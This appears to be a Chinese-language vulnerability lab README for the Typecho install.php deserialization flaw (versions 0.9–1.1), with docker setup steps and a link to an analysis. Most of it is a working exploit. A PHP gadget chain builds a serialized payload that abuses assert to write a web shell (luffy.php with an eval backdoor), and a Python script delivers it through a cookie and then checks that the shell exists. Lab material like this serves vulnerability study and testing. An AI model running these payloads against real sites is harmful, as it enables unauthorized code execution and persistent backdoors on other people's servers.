## 环境构建
```
docker-compose build 
docker-compose up -d
```

tip:系统在部署的时候Typecho/1.0/mysql/schema.sql的'siteUrl',0,'http://10.0.0.211'改成对应的ip地址

## 漏洞介绍
typecho的install反序列漏洞，该漏洞影响的版本从0.9版本到1.1



getshell payload
0x01 首先生成padyload
```
<?php

class Typecho_Feed{
    private $_type = 'ATOM 1.0';
    private $_charset = 'UTF-8';
    private $_lang = 'zh';
    private $_items = array();

    public function addItem(array $item){
        $this->_items[] = $item;
    }
}

class Typecho_Request{
    private $_params = array('screenName'=>'file_put_contents(\'luffy.php\', \'<?php @eval($_POST[luffy]);?>\')');
    private $_filter = array('assert');
}

$payload1 = new Typecho_Feed();
$payload2 = new Typecho_Request();
$payload1->addItem(array('author' => $payload2));
$exp = array('adapter' => $payload1, 'prefix' => 'typecho');
echo base64_encode(serialize($exp));
?>
```

然后填充内容到exp
```
# -*- coding:utf-8 -*-
import requests,re
from bs4 import BeautifulSoup as bs

def send(url):
    # exp = 'YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NTp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIyOiIAVHlwZWNob19GZWVkAF92ZXJzaW9uIjtpOjE7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJlbiI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwYXNzLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NDoidGgxcyI7fQ==+JykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjQ6InRoMXMiO30'
    exp = "YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjM6ImZpbGVfcHV0X2NvbnRlbnRzKCdsdWZmeS5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW2x1ZmZ5XSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ=="
    referer = "http://"+url+"/admin"
    cookies = {'__typecho_config':exp}
    params = {"finish":1}
    headers = {
        'Accept-Language': 'zh-CN,zh;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
        'Referer': referer,
        'Host' : url
        }
    attack_url = "http://" + url + "/install.php"
    exp_url ="http://" + url + "/luffy.php"
    # print(attack_url)
    try:
        response = requests.get(attack_url,params=params,headers=headers,cookies=cookies)

        response2 = requests.get(exp_url,params=params,headers=headers)


        if response2.status_code == 200:
            print("wonderful! url is "+ exp_url + "\n")
        else:
            print("测试失败")
    except Exception as e:
        print(e)
        print("requests error")



send("127.0.0.1")

```
![](luffy.png)



## 漏洞连接
[链接一](https://lorexxar.cn/2017/10/26/typecho-getshell/)

